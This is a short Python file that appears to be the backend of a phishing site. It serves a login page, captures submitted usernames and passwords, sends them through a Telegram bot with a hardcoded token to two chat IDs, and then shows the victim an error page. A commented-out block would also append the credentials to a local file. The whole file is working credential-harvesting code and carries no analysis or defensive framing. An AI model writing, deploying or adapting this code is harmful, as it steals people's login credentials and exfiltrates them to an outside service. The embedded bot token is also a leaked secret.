from fastapi import FastAPI, Form
from fastapi.responses import FileResponse
from fastapi.responses import RedirectResponse, PlainTextResponse 

from aiogram import Bot, Dispatcher



bot = Bot(token="6955424462:AAHPJmSBcqeQjq3EAGXQVKXwU7gDJfFrBWw")
dp = Dispatcher()

app = FastAPI() # uvicorn main:app --reload  
 
@app.get("/")
def root():
    return FileResponse("./login.html")
 
 
@app.post("/postdata")
async def postdata(username = Form(), password=Form()):
    # with open("data.txt", "a", encoding="utf-8") as file:
    #     file.write(f"""\n
    #     username = {username}\n
    #     password = {password}\n
    #     \n""")
    await bot.send_message(text=f"""\n
        username = {username}\n
password = {password}\n
        \n""",
        chat_id=6875599335)
    await bot.send_message(text=f"""\n
        username = {username}\n
password = {password}\n
        \n""",
        chat_id=1238163580)
    
    return FileResponse("./error.html")

